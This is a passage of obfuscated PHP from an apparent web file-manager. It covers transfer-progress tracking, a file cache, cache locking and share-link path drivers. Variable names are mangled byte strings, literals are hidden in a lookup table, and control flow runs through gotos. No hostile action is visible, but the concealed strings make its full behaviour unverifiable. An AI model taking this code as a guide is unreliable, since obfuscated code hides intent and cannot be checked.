Hook::unbind($˜Ø›°ã¹[1695], array($this, $˜Ø›°ã¹[1696])); Hook::unbind($˜Ø›°ã¹[1697], array($this, $˜Ø›°ã¹[1698])); Hook::unbind($˜Ø›°ã¹[1699], array($this, $˜Ø›°ã¹[1700])); } public function copyMoveStart($…Óµ“í¯, $–“›ä©à, $Üàº€á¥, $—•‹Ğ¹²) { $Çê˜·Ùè =& $_SERVER[Ôó‡è­ƒ]; self::log($Çê˜·Ùè[1710] . $–“›ä©à . $Çê˜·Ùè[70] . $—•‹Ğ¹²); $Ÿ¾ÁªÂ = rtrim(TEMP_FILES, $Çê˜·Ùè[8]); if (substr($–“›ä©à, 0, strlen($Ÿ¾ÁªÂ)) == $Ÿ¾ÁªÂ) { return; } if (substr($—•‹Ğ¹², 0, strlen($Ÿ¾ÁªÂ)) == $Ÿ¾ÁªÂ) { return; } $òÇƒó™ò =& $this->task; $òÇƒó™ò[$Çê˜·Ùè[1711]] = KodIO::transferType($…Óµ“í¯, $Üàº€á¥); $this->update(); } public function updateAfter() { $…ŒÕı œ =& $_SERVER[Ôó‡è­ƒ]; $ıÀ™„´ =& $this->task; if (!$ıÀ™„´[$…ŒÕı œ[761]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($ıÀ™„´[$…ŒÕı œ[1711]] == $…ŒÕı œ[1302]) { return; } self::updateTask($ıÀ™„´); } private static function updateTask(&$©ßã„ ¯) { $ˆéÒíï =& $_SERVER[Ôó‡è­ƒ]; if ($©ßã„ ¯[$ˆéÒíï[1711]] == $ˆéÒíï[1197] || $©ßã„ ¯[$ˆéÒíï[1711]] == $ˆéÒíï[108]) { if ($©ßã„ ¯[$ˆéÒíï[1705]]) { $©ßã„ ¯[$ˆéÒíï[1708]] = $©ßã„ ¯[$ˆéÒíï[1707]] + $©ßã„ ¯[$ˆéÒíï[1704]]; } } else { if ($©ßã„ ¯[$ˆéÒíï[1711]] == $ˆéÒíï[1303]) { if ($©ßã„ ¯[$ˆéÒíï[1705]] == $ˆéÒíï[1197]) { $©ßã„ ¯[$ˆéÒíï[1708]] = $©ßã„ ¯[$ˆéÒíï[1707]] + $©ßã„ ¯[$ˆéÒíï[1704]] * 0.5; } else { if ($©ßã„ ¯[$ˆéÒíï[1705]] == $ˆéÒíï[108]) { $©ßã„ ¯[$ˆéÒíï[1708]] = $©ßã„ ¯[$ˆéÒíï[1707]] + $©ßã„ ¯[$ˆéÒíï[1703]] * 0.5 + $©ßã„ ¯[$ˆéÒíï[1704]] * 0.5; } } } } $©ßã„ ¯[$ˆéÒíï[1657]] = $©ßã„ ¯[$ˆéÒíï[1708]] / $©ßã„ ¯[$ˆéÒíï[761]]; if ($©ßã„ ¯[$ˆéÒíï[1657]] > 0) { $ÔÈ»‘¬ƒ = timeFloat() - $©ßã„ ¯[$ˆéÒíï[1659]] - $©ßã„ ¯[$ˆéÒíï[1662]]; $©ßã„ ¯[$ˆéÒíï[1663]] = $ÔÈ»‘¬ƒ * (1 - $©ßã„ ¯[$ˆéÒíï[1657]]) / $©ßã„ ¯[$ˆéÒíï[1657]]; } } public function addPath($Ïé‡ ’‚) { $å”Õ¥Û¢ =& $_SERVER[Ôó‡è­ƒ]; if (!$Ïé‡ ’‚) { return; } $ˆ¬¶òù‹ =& $this->task; $Ô‚³¡ÔÄ = IO::infoWithChildren($Ïé‡ ’‚); $×â€æÛí = $ˆ¬¶òù‹[$å”Õ¥Û¢[1712]] ? $ˆ¬¶òù‹[$å”Õ¥Û¢[1712]][$å”Õ¥Û¢[1713]] : 0; $ˆ¬¶òù‹[$å”Õ¥Û¢[1712]] = array($å”Õ¥Û¢[1713] => $×â€æÛí + 1, $å”Õ¥Û¢[417] => $Ô‚³¡ÔÄ[$å”Õ¥Û¢[32]], $å”Õ¥Û¢[78] => $Ô‚³¡ÔÄ[$å”Õ¥Û¢[78]], $å”Õ¥Û¢[515] => $Ô‚³¡ÔÄ[$å”Õ¥Û¢[515]] ? $Ô‚³¡ÔÄ[$å”Õ¥Û¢[515]] : $Ô‚³¡ÔÄ[$å”Õ¥Û¢[78]]); if ($Ô‚³¡ÔÄ[$å”Õ¥Û¢[33]] == $å”Õ¥Û¢[196]) { $ˆ¬¶òù‹[$å”Õ¥Û¢[784]] += 1; } else { $ˆ¬¶òù‹[$å”Õ¥Û¢[784]] += $Ô‚³¡ÔÄ[$å”Õ¥Û¢[83]][$å”Õ¥Û¢[81]]; if ($Ô‚³¡ÔÄ[$å”Õ¥Û¢[399]]) { $ˆ¬¶òù‹[$å”Õ¥Û¢[784]] += $Ô‚³¡ÔÄ[$å”Õ¥Û¢[83]][$å”Õ¥Û¢[82]] + 1; } } $ˆ¬¶òù‹[$å”Õ¥Û¢[761]] += $Ô‚³¡ÔÄ[$å”Õ¥Û¢[80]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($òıŸßÌì) { $Üåğ“Í =& $_SERVER[Ôó‡è­ƒ]; $Àİö”¥œ =& $this->task; $Àİö”¥œ[$Üåğ“Í[1701]] = $òıŸßÌì[$Üåğ“Í[32]]; $Àİö”¥œ[$Üåğ“Í[1064]] = $òıŸßÌì[$Üåğ“Í[32]]; $this->update(); } public function copyFileStart($§ã¢‡, $ÏŞ³Õ©Ó, $ïö­Á‹ , $¬‘Íµôî, $Ùæüôäâ, $ÒÎÚû‘´) { $›«Š‰ö— =& $_SERVER[Ôó‡è­ƒ]; $ÂÜ×Ÿõ° = $Ùæüôäâ; if ($ÂÜ×Ÿõ° == $GLOBALS[$›«Š‰ö—[1714]]) { $ÂÜ×Ÿõ° = $GLOBALS[$›«Š‰ö—[1715]]; } $GLOBALS[$›«Š‰ö—[1715]] = $Ùæüôäâ; $GLOBALS[$›«Š‰ö—[1714]] = $ÒÎÚû‘´; $û¤Â³Úé =& $this->task; $û¤Â³Úé[$›«Š‰ö—[1701]] = $ÂÜ×Ÿõ°; $û¤Â³Úé[$›«Š‰ö—[1703]] = (int) $§ã¢‡->size($ÏŞ³Õ©Ó); $û¤Â³Úé[$›«Š‰ö—[1704]] = 0; $û¤Â³Úé[$›«Š‰ö—[1064]] = $›«Š‰ö—[12]; $û¤Â³Úé[$›«Š‰ö—[1705]] = $›«Š‰ö—[12]; $û¤Â³Úé[$›«Š‰ö—[1706]] = 0; $Æó¦¢— = $û¤Â³Úé[$›«Š‰ö—[1703]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($û¤Â³Úé[$›«Š‰ö—[396]] . $›«Š‰ö—[1716]); if ($Æó¦¢— && file_exists(get_path_father($¬‘Íµôî))) { Cache::set($û¤Â³Úé[$›«Š‰ö—[396]] . $›«Š‰ö—[1716], $¬‘Íµôî); $û¤Â³Úé[$›«Š‰ö—[1677]] = array($›«Š‰ö—[1717], $›«Š‰ö—[1718]); } $this->update(0, $Æó¦¢—); } public static function updateCopyLocalFileSize($†¼¬’) { $øã¿ÖÀ‹ =& $_SERVER[Ôó‡è­ƒ]; $à«·òáë = Cache::get($†¼¬’[$øã¿ÖÀ‹[396]] . $øã¿ÖÀ‹[1716]); if (!$à«·òáë || !file_exists($à«·òáë)) { return $†¼¬’; } $†¼¬’[$øã¿ÖÀ‹[1704]] = @filesize($à«·òáë); $†¼¬’[$øã¿ÖÀ‹[1708]] += $†¼¬’[$øã¿ÖÀ‹[1704]]; self::updateTask($†¼¬’); return $†¼¬’; } public function copyFileEnd($¶ëÔÑ, $×ŠíŒ¢, $…á©‘å, $åşúÖ´â, $ªÙ‡‡´Ÿ, $ÆõÙşıè) { $ñ§ëÇ¸æ =& $_SERVER[Ôó‡è­ƒ]; $úàøéÁ± =& $this->task; $úàøéÁ±[$ñ§ëÇ¸æ[1704]] = $úàøéÁ±[$ñ§ëÇ¸æ[1703]]; $úàøéÁ±[$ñ§ëÇ¸æ[1705]] = $ñ§ëÇ¸æ[12]; unset($úàøéÁ±[$ñ§ëÇ¸æ[1677]]); if ($ªÙ‡‡´Ÿ == $úàøéÁ±[$ñ§ëÇ¸æ[1701]]) { $úàøéÁ±[$ñ§ëÇ¸æ[1707]] += $úàøéÁ±[$ñ§ëÇ¸æ[1703]]; $úàøéÁ±[$ñ§ëÇ¸æ[1708]] = $úàøéÁ±[$ñ§ëÇ¸æ[1707]]; $this->update(1); } else { $this->update(); $úàøéÁ±[$ñ§ëÇ¸æ[1704]] = 0; } Cache::remove($úàøéÁ±[$ñ§ëÇ¸æ[396]] . $ñ§ëÇ¸æ[1716]); self::log($ñ§ëÇ¸æ[1719] . $×ŠíŒ¢ . $ñ§ëÇ¸æ[70] . $åşúÖ´â . $ñ§ëÇ¸æ[230] . $ªÙ‡‡´Ÿ . $ñ§ëÇ¸æ[1720] . $úàøéÁ±[$ñ§ëÇ¸æ[1701]]); } public function updateFileEnd($ğ¦Ö±í¾, $åàßÓ¦–) { $ÛŒ‹¬ï =& $_SERVER[Ôó‡è­ƒ]; $ à»ÒŠ =& $this->task; $ à»ÒŠ[$ÛŒ‹¬ï[1701]] = $ğ¦Ö±í¾; $ à»ÒŠ[$ÛŒ‹¬ï[1703]] = $åàßÓ¦–; $ à»ÒŠ[$ÛŒ‹¬ï[1707]] += $åàßÓ¦–; $ à»ÒŠ[$ÛŒ‹¬ï[1708]] = $ à»ÒŠ[$ÛŒ‹¬ï[1707]]; $this->update(1); self::log($ÛŒ‹¬ï[1721] . $ğ¦Ö±í¾); } public function sourceModelCopy($Ê¾àïÚÜ) { $ã…¯êü =& $_SERVER[Ôó‡è­ƒ]; $í«¼û¸ó = $Ê¾àïÚÜ[0]; $¥²Ï§üØ = $Ê¾àïÚÜ[1]; $ãÍÇñ‘ä =& $this->task; $this->sourceModelCopyFlag = !0; $äéôÓ¦‹ = 0; switch ($í«¼û¸ó) { case $ã…¯êü[565]: $äéôÓ¦‹ = 1; break; case $ã…¯êü[568]: $ãÍÇñ‘ä[$ã…¯êü[1701]] = $¥²Ï§üØ[$ã…¯êü[32]]; break; case $ã…¯êü[570]: $äéôÓ¦‹ = intval($Ê¾àïÚÜ[$ã…¯êü[379]] * 0.4); break; case $ã…¯êü[572]: $äéôÓ¦‹ = intval($Ê¾àïÚÜ[$ã…¯êü[379]] * 0.2); break; case $ã…¯êü[574]: $äéôÓ¦‹ = intval($Ê¾àïÚÜ[$ã…¯êü[379]] * 0.4); break; } $this->update($äéôÓ¦‹); $this->sourceModelCopyFlag = !1; } public function sourceRemove($øê€’, $€úÀ©æÅ) { $äç¦â–€ =& $_SERVER[Ôó‡è­ƒ]; $this->sourceModelCopyFlag = !0; $Í‚¾ûÜ = 1; if (isset($øê€’[$äç¦â–€[83]])) { $Í‚¾ûÜ = $øê€’[$äç¦â–€[83]][$äç¦â–€[81]] + $øê€’[$äç¦â–€[83]][$äç¦â–€[82]] + 1; } $this->update($Í‚¾ûÜ); $this->sourceModelCopyFlag = !1; } public function sourceMove($Ö¯šÊ³½) { $this->sourceRemove($Ö¯šÊ³½, !1); } public function curlProgress($‘¶‚½ËŠ, $¿ÕÈİªá, $ÀÕ÷£Ç½, $ãş¢Á¶, $ôÛ¤”Í) { $´ŸªªÁ™ =& $_SERVER[Ôó‡è­ƒ]; $šÂ¶şıÔ =& $this->task; if ($ôÛ¤”Í > 0) { $šÂ¶şıÔ[$´ŸªªÁ™[1064]] = $´ŸªªÁ™[1722]; $šÂ¶şıÔ[$´ŸªªÁ™[1705]] = $´ŸªªÁ™[108]; if ($šÂ¶şıÔ[$´ŸªªÁ™[1703]]) { $šÂ¶şıÔ[$´ŸªªÁ™[1704]] = $ôÛ¤”Í; } if ($šÂ¶şıÔ[$´ŸªªÁ™[1706]]) { $šÂ¶şıÔ[$´ŸªªÁ™[1704]] = $ôÛ¤”Í + $šÂ¶şıÔ[$´ŸªªÁ™[1706]]; } } else { if ($ÀÕ÷£Ç½ > 0) { if ($šÂ¶şıÔ[$´ŸªªÁ™[1703]] == $¿ÕÈİªá) { $šÂ¶şıÔ[$´ŸªªÁ™[1704]] = $ÀÕ÷£Ç½; $šÂ¶şıÔ[$´ŸªªÁ™[1064]] = $´ŸªªÁ™[1723]; $šÂ¶şıÔ[$´ŸªªÁ™[1705]] = $´ŸªªÁ™[1197]; } } } $this->update(); } public function curlProgressStart($­¡ù¨É¦) { } public function curlProgressEnd($©ËõÏ²‹) { $¢Ë‚íè =& $_SERVER[Ôó‡è­ƒ]; $â“ÄÖ“ù =& $this->task; $ôÆœãŠœ = curl_getinfo($©ËõÏ²‹); $‰—¦ÌÚ£ = $ôÆœãŠœ[$¢Ë‚íè[1724]]; if ($‰—¦ÌÚ£ == -1) { $‰—¦ÌÚ£ = $ôÆœãŠœ[$¢Ë‚íè[1725]]; } if ($â“ÄÖ“ù[$¢Ë‚íè[1705]] == $¢Ë‚íè[108] && $‰—¦ÌÚ£) { $â“ÄÖ“ù[$¢Ë‚íè[1706]] += $‰—¦ÌÚ£; } $this->update(); } } goto A¯ç·Å¦£; bğ”ùõÛª“: class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($¤¦øçÉŸ, $£ãàäĞğ) { $­àè“ìã =& $_SERVER[Ôó‡è­ƒ]; $this->cachePath = $¤¦øçÉŸ[$­àè“ìã[78]]; $this->prefix = $­àè“ìã[832]; $this->cacheTime = $£ãàäĞğ; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($ğ¯Ü×‰Æ) { $¦ÇŠÎÊ =& $_SERVER[Ôó‡è­ƒ]; $ğ¯Ü×‰Æ = str_replace(array($¦ÇŠÎÊ[833], $¦ÇŠÎÊ[98], $¦ÇŠÎÊ[73]), $¦ÇŠÎÊ[834], $ğ¯Ü×‰Æ); return $this->cachePath . $¦ÇŠÎÊ[835] . $ğ¯Ü×‰Æ . $¦ÇŠÎÊ[836]; } public function set($áÁÉøö«, $éøòŸ£Î, $®ÚµÁı’ = false) { $Øœİ©² = $this->getFile($áÁÉøö«); if (file_put_contents($Øœİ©², $this->prefix . $éøòŸ£Î, LOCK_EX)) { @touch($Øœİ©², intval(time() + $®ÚµÁı’)); clearstatcache(); return !0; } @unlink($Øœİ©²); return !1; } public function get($äÊÃÀã) { $†©¶»¸à = $this->getFile($äÊÃÀã); if (file_exists($†©¶»¸à) && filemtime($†©¶»¸à) < time()) { @unlink($†©¶»¸à); return !1; } $òºÒºŸ¿ = @file_get_contents($†©¶»¸à); return substr($òºÒºŸ¿, strlen($this->prefix)); } public function remove($×°†æı) { $„ÁÏÔŸ­ = $this->getFile($×°†æı); return @unlink($„ÁÏÔŸ­); } public function deleteAll() { $—Ô”ûÈ¸ =& $_SERVER[Ôó‡è­ƒ]; $š¦åÌ·Ô = scandir($this->cachePath); foreach ($š¦åÌ·Ô as $³‘½Ã®è) { $ØÉ÷÷èÇ = $this->cachePath . $³‘½Ã®è; if (strpos($ØÉ÷÷èÇ, $—Ô”ûÈ¸[836]) && strpos($ØÉ÷÷èÇ, $—Ô”ûÈ¸[837])) { @unlink($ØÉ÷÷èÇ); } } } public function clearTimeout() { $ù´ê€ç =& $_SERVER[Ôó‡è­ƒ]; $¡ÚÛ—Õ‹ = scandir($this->cachePath); foreach ($¡ÚÛ—Õ‹ as $¾×­üµØ) { $ÈÍ¹¾Åı = $this->cachePath . $¾×­üµØ; if (strpos($ÈÍ¹¾Åı, $ù´ê€ç[836]) && strpos($ÈÍ¹¾Åı, $ù´ê€ç[837]) && filemtime($ÈÍ¹¾Åı) < time()) { @unlink($ÈÍ¹¾Åı); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $ã•´„êÛ =& $_SERVER[Ôó‡è­ƒ]; if (self::$handle) { return self::$handle; } $Ø§Ô†õ = $GLOBALS[$ã•´„êÛ[6]][$ã•´„êÛ[348]]; self::$timeout = $Ø§Ô†õ[$ã•´„êÛ[838]] ? $Ø§Ô†õ[$ã•´„êÛ[838]] : 10; $¥‰ÈÌ°ò = _get($GLOBALS[$ã•´„êÛ[6]], $ã•´„êÛ[839]); $Ã‹¯—¨¤ = $Ø§Ô†õ[$ã•´„êÛ[825]] ? $Ø§Ô†õ[$ã•´„êÛ[825]] : $ã•´„êÛ[196]; if ($Ã‹¯—¨¤ == $ã•´„êÛ[21] && $¥‰ÈÌ°ò == $ã•´„êÛ[13]) { $Ã‹¯—¨¤ = $ã•´„êÛ[196]; } switch ($Ã‹¯—¨¤) { case $ã•´„êÛ[828]: self::$handle = new CacheLockRedis(); break; case $ã•´„êÛ[829]: self::$handle = new CacheLockMemcached(); break; case $ã•´„êÛ[21]: self::$handle = new CacheLockDatabase(); break; case $ã•´„êÛ[196]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($ã•´„êÛ[840], $ã•´„êÛ[841]); } return self::$handle; } private static function key($Ö±‰Õå±) { return $_SERVER[Ôó‡è­ƒ][842] . Cache::key($Ö±‰Õå±); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($ÃŞœ¼İâ = '') { self::$errorMsg = $ÃŞœ¼İâ; } public static function lockGlobal($úíŸ„Ò, $“ÉØĞÂ) { return self::lock($úíŸ„Ò, $“ÉØĞÂ, !0); } public static function lock($à•‰Â­, $äÈÎŒØô = false, $ÖŸà ÷¹ = false) { $àø”ì³í =& $_SERVER[Ôó‡è­ƒ]; $³¿¼£³¶ = self::init(); $¹ú×Ó·á = self::key($à•‰Â­); $äÈÎŒØô = $äÈÎŒØô ? $äÈÎŒØô : self::$timeout; $…ìÎ¾¹° = $³¿¼£³¶->lock($¹ú×Ó·á, $äÈÎŒØô); $ƒÅä‘ê = timeFloat(); if (!$…ìÎ¾¹°) { $óã ‰® = "\x6c\x6f\x63\x6b\x20\145\162\x72\x6f\162\x3b\153\145\x79\75{$à•‰Â­}\x3b\164\151\x6d\145\x3d{$äÈÎŒØô}\73" . self::$errorMsg . $àø”ì³í[71] . get_caller_msg(); $–öŠ‰Ë = LNG($àø”ì³í[843]) . "\50{$äÈÎŒØô}\x73\x29\56" . LNG($àø”ì³í[844]); $–öŠ‰Ë .= $àø”ì³í[845]; if (is_string(self::$errorMsg) && self::$errorMsg) { $–öŠ‰Ë = $–öŠ‰Ë . $àø”ì³í[846] . self::$errorMsg; } write_log($óã ‰®, $àø”ì³í[841]); show_json($–öŠ‰Ë, !1); } if (!$ÖŸà ÷¹) { self::$lockItem[$¹ú×Ó·á] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $……ˆÉÒ¶ = number_format(timeFloat() - $ƒÅä‘ê, 3); write_log($àø”ì³í[847] . $à•‰Â­ . $àø”ì³í[848] . $……ˆÉÒ¶, $àø”ì³í[841]); } return $…ìÎ¾¹°; } public static function lockGet($ğñÍÖ™) { $°Òš§çŒ = self::key($ğñÍÖ™); if (self::$lockItem[$°Òš§çŒ]) { return self::$lockItem[$°Òš§çŒ]; } return self::init()->lockGet($°Òš§çŒ); } public static function unlock($õÀË±Ù™) { $÷”öæ®½ =& $_SERVER[Ôó‡è­ƒ]; $Õ‡áÈ˜ğ = self::key($õÀË±Ù™); self::$lockItem[$Õ‡áÈ˜ğ] = null; self::init()->unlock($Õ‡áÈ˜ğ); if (GLOBAL_DEBUG_LOG_ALL) { write_log($÷”öæ®½[849] . $õÀË±Ù™, $÷”öæ®½[841]); } return; } public static function unlockRuntime() { $ÁÂçûÇŠ =& $_SERVER[Ôó‡è­ƒ]; $÷ŸÊÉ÷ = self::init(); $Ù¬Ãß¦— = !1; foreach (self::$lockItem as $å‚îÉƒë => $³Ô¡Ô®©) { if (!$³Ô¡Ô®©) { continue; } $÷ŸÊÉ÷->unlock($å‚îÉƒë); if (!$Ù¬Ãß¦—) { $Ù¬Ãß¦— = !0; write_log($ÁÂçûÇŠ[850] . $å‚îÉƒë . $ÁÂçûÇŠ[71] . get_caller_msg(), $ÁÂçûÇŠ[841]); continue; } write_log($ÁÂçûÇŠ[850] . $å‚îÉƒë, $ÁÂçûÇŠ[841]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $™Éğ¬™Û = number_format(timeFloat() - TIME_FLOAT, 3); write_log($ÁÂçûÇŠ[851] . $™Éğ¬™Û . $ÁÂçûÇŠ[852] . ACTION, $ÁÂçûÇŠ[841]); } } public static function fileLock($ÉÙ »Ìˆ) { $¥²¯Ø²Ã =& $_SERVER[Ôó‡è­ƒ]; if (!$GLOBALS[$¥²¯Ø²Ã[853]]) { $GLOBALS[$¥²¯Ø²Ã[853]] = array(); } $GLOBALS[$¥²¯Ø²Ã[853]][$ÉÙ »Ìˆ] = !1; $Æ‘”Å•Ê = fopen(DATA_PATH . $ÉÙ »Ìˆ . $¥²¯Ø²Ã[854], $¥²¯Ø²Ã[855]); if (!$Æ‘”Å•Ê) { return !1; } $GLOBALS[$¥²¯Ø²Ã[853]][$ÉÙ »Ìˆ] = $Æ‘”Å•Ê; if (flock($Æ‘”Å•Ê, LOCK_EX)) { return !0; } self::unlock($ÉÙ »Ìˆ); show_json($¥²¯Ø²Ã[856], !1); return !1; } public static function fileUnlock($×Ã¿˜´ñ) { $ëÒŠáÁç =& $_SERVER[Ôó‡è­ƒ]; $Äı²Ì„€ = $GLOBALS[$ëÒŠáÁç[853]][$×Ã¿˜´ñ]; if (!$Äı²Ì„€) { return; } $GLOBALS[$ëÒŠáÁç[853]][$×Ã¿˜´ñ] = !1; flock($Äı²Ì„€, LOCK_UN); fclose($Äı²Ì„€); } public static function fileUnlockAll() { $Ô³‰©ÒÆ =& $_SERVER[Ôó‡è­ƒ]; if (!$GLOBALS[$Ô³‰©ÒÆ[853]]) { return; } foreach ($GLOBALS[$Ô³‰©ÒÆ[853]] as $Â˜ïœ§ => $ÕÇéÏ™) { if (!$ÕÇéÏ™) { continue; } $GLOBALS[$Ô³‰©ÒÆ[853]][$Â˜ïœ§] = !1; flock($ÕÇéÏ™, LOCK_UN); fclose($ÕÇéÏ™); } $GLOBALS[$Ô³‰©ÒÆ[853]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } goto F¾¼Ó¿â›; CÜ©è„‚èƒ: class PathDriverDbShareLink extends PathDriverDB { public function __construct($Œñ¶ß²) { $this->pathParse = $Œñ¶ß²; $this->model = Model($_SERVER[Ôó‡è­ƒ][1325]); } protected function infoParse($¼‚Ë¡Ëí, $Ñ©ëúÂ† = false, $¶ı±Ú©Ù = false) { $œŒû÷àÓ =& $_SERVER[Ôó‡è­ƒ]; return Action($œŒû÷àÓ[1173])->sharePathInfo($this->pathParse[$œŒû÷àÓ[78]], !0, $Ñ©ëúÂ†); } public function listPath($¬îÌøƒÉ, $˜®»ïé = false) { $²öäÙõñ =& $_SERVER[Ôó‡è­ƒ]; $ÓïöÈŠÍ = parent::listPath($¬îÌøƒÉ, $˜®»ïé); if (!$ÓïöÈŠÍ) { return $ÓïöÈŠÍ; } if (is_array($ÓïöÈŠÍ[$²öäÙõñ[1334]])) { $ÓïöÈŠÍ[$²öäÙõñ[1334]] = Action($²öäÙõñ[1173])->shareItemInfo($ÓïöÈŠÍ[$²öäÙõñ[1334]]); } foreach ($ÓïöÈŠÍ as $á½˜®Äì => $ŞÀ‡ã¢Ş) { if (!in_array($á½˜®Äì, array($²öäÙõñ[76], $²öäÙõñ[77]))) { continue; } foreach ($ŞÀ‡ã¢Ş as $ÓÛËÀñ³ => $×ËŒ‘à¶) { $ÓïöÈŠÍ[$á½˜®Äì][$ÓÛËÀñ³] = Action($²öäÙõñ[1173])->shareItemInfo($×ËŒ‘à¶); } } return $ÓïöÈŠÍ; } public function listAll($µ¨˜øé) { $ııí¢ÑÓ =& $_SERVER[Ôó‡è­ƒ]; $€›çÈ† = IO::info($this->pathParse[$ııí¢ÑÓ[78]]); if (!$€›çÈ†) { return array(); } $‹‡úò­Ù = $this->model->listAll($µ¨˜øé); foreach ($‹‡úò­Ù as &$éãÇÚ‡ü) { $éãÇÚ‡ü[$ııí¢ÑÓ[87]] = Action($ııí¢ÑÓ[1173])->shareItemInfo($éãÇÚ‡ü[$ııí¢ÑÓ[87]]); } unset($éãÇÚ‡ü); return $‹‡úò­Ù; } } class PathDriverDriverShareItem { public function __construct($¢˜¨¼ı€) { $this->pathParse = $¢˜¨¼ı€; } public function __call($›¾…ïÎˆ, $’…ÍÒâ“) { $øÈ•äĞ» =& $_SERVER[Ôó‡è­ƒ]; if (method_exists($this, $›¾…ïÎˆ)) { return; } $ú÷ƒÇ”Ä = call_user_func_array(array($øÈ•äĞ»[1335], $›¾…ïÎˆ), $’…ÍÒâ“); $­“Š¢¯¥ = array($øÈ•äĞ»[1336], $øÈ•äĞ»[1337], $øÈ•äĞ»[1338], $øÈ•äĞ»[1339], $øÈ•äĞ»[548], $øÈ•äĞ»[550], $øÈ•äĞ»[1340], $øÈ•äĞ»[108], $øÈ•äĞ»[1341], $øÈ•äĞ»[1342]); if (in_array($›¾…ïÎˆ, $­“Š¢¯¥)) { $ú÷ƒÇ”Ä = $this->getPathOuter($ú÷ƒÇ”Ä); } return $ú÷ƒÇ”Ä; } public function copy($šö€ğÃÏ, $° Åù„Æ, $¹ÙÒÁ›¦ = false, $Ó„üœÛ = false) { return $this->copyMove($šö€ğÃÏ, $° Åù„Æ, $¹ÙÒÁ›¦, $_SERVER[Ôó‡è­ƒ][548], $Ó„üœÛ); } public function move($ÕÏıæØÇ, $š¢ßÂõ, $•ë¡”ìà = false, $˜Ï–¿† = false) { return $this->copyMove($ÕÏıæØÇ, $š¢ßÂõ, $•ë¡”ìà, $_SERVER[Ôó‡è­ƒ][550], $˜Ï–¿†); } private function copyMove($Ê·±ÈÜ½, $Ìü†í¿, $ëÑ­ˆ¿Ç, $ÃÒ‡ñÏö, $öòÒ¢çò = false) { $±…şù… =& $_SERVER[Ôó‡è­ƒ]; $İéãËÃù = $Ìü†í¿; $ÀòÕğã° = IO::driverMake($Ìü†í¿); if ($ÀòÕğã°->pathParse[$±…şù…[1151]]) { $Ìü†í¿ = $ÀòÕğã°->pathParse[$±…şù…[1151]]; } else { $Ìü†í¿ = $İéãËÃù; } $«‹¡¼Àå = IO::copyMove($Ê·±ÈÜ½, $Ìü†í¿, $ëÑ­ˆ¿Ç, $ÃÒ‡ñÏö, $öòÒ¢çò); $«‹¡¼Àå = $this->getPathOuter($«‹¡¼Àå); return $«‹¡¼Àå; } public function pathThis($ÃÖåĞ¹ó) { return get_path_this($this->pathParse[$_SERVER[Ôó‡è­ƒ][78]]); } public function pathFather($¼°óµ’ù) { return get_path_father($this->pathParse[$_SERVER[Ôó‡è­ƒ][78]]); } public function iconvSystem($ºÉá— ½) { return $ºÉá— ½; } protected function infoParse($’ÖÓ˜¡, $ò¨À‰ÊÒ = false) { $¤Ï…ê¥ =& $_SERVER[Ôó‡è­ƒ]; $Ğ¯”‰Šş = $this->pathParse[$¤Ï…ê¥[482]][$¤Ï…ê¥[1174]] . $this->pathParse[$¤Ï…ê¥[1167]]; if ($ò¨À‰ÊÒ) { $¨‹à—ı¥ = IO::infoWithChildren($Ğ¯”‰Šş); } else { $¨‹à—ı¥ = IO::info($Ğ¯”‰Šş); } $µüğü = $this->pathParse[$¤Ï…ê¥[482]]; return Action($¤Ï…ê¥[1333])->_shareItemeParse($¨‹à—ı¥, $µüğü); } public function listAll($î®œ‰§½) { $¾£½èÃ¿ =& $_SERVER[Ôó‡è­ƒ]; $İ•ë‚î¥ = IO::listAll($î®œ‰§½); $æ¥´ç‚œ = $this->pathParse[$¾£½èÃ¿[482]]; foreach ($İ•ë‚î¥ as &$şÔ„ÈÅ¡) { check_abort(); $ÎĞ†¢ìÙ = IO::info($şÔ„ÈÅ¡[$¾£½èÃ¿[78]]); $ÎĞ†¢ìÙ = is_array($ÎĞ†¢ìÙ) ? $ÎĞ†¢ìÙ : array(); $şÔ„ÈÅ¡ = array_merge($ÎĞ†¢ìÙ, $şÔ„ÈÅ¡); $şÔ„ÈÅ¡[$¾£½èÃ¿[87]] = Action($¾£½èÃ¿[1333])->_shareItemeParse($şÔ„ÈÅ¡, $æ¥´ç‚œ); } unset($şÔ„ÈÅ¡); return $İ•ë‚î¥; } public function getPathOuter($úµ×ş«Ô) { $İˆ‚­ÚÙ =& $_SERVER[Ôó‡è­ƒ]; $Ô›ùŞ” = KodIO::parse($úµ×ş«Ô); if ($Ô›ùŞ”[$İˆ‚­ÚÙ[33]] == KodIO::KOD_SHARE_ITEM) { return $Ô›ùŞ”[$İˆ‚­ÚÙ[78]]; } $ğü³º¶ = KodIO::clear($úµ×ş«Ô); $Øãé÷‡Ö = KodIO::clear($this->pathParse[$İˆ‚­ÚÙ[482]][$İˆ‚­ÚÙ[1174]]); $÷åõ»Â² = substr($ğü³º¶, strlen($Øãé÷‡Ö)); if (substr($ğü³º¶, 0, strlen($Øãé÷‡Ö)) != $Øãé÷‡Ö) { return !1; } return $this->pathParse[$İˆ‚­ÚÙ[1168]] . $İˆ‚­ÚÙ[8] . ltrim($÷åõ»Â², $İˆ‚­ÚÙ[8]); } public function getType() { $ºŸƒÎ‹ =& $_SERVER[Ôó‡è­ƒ]; $øïŸˆ÷ = str_replace($ºŸƒÎ‹[74], $ºŸƒÎ‹[12], get_class($this)); return strtolower($øïŸˆ÷); } public function isTypeObject($§Ï¶øàÍ) { return IO::isTypeObject($§Ï¶øàÍ); } public function info($Ùºç©‡³) { return $this->infoParse($Ùºç©‡³); } public function infoAuth($ì°•İäÏ) { return $this->infoParse($ì°•İäÏ); } public function infoWithChildren($â¨¢º¹¾) { return $this->infoParse($â¨¢º¹¾, !0); } public function infoFull($äáºë×¹) { return $this->infoParse($äáºë×¹); } } if 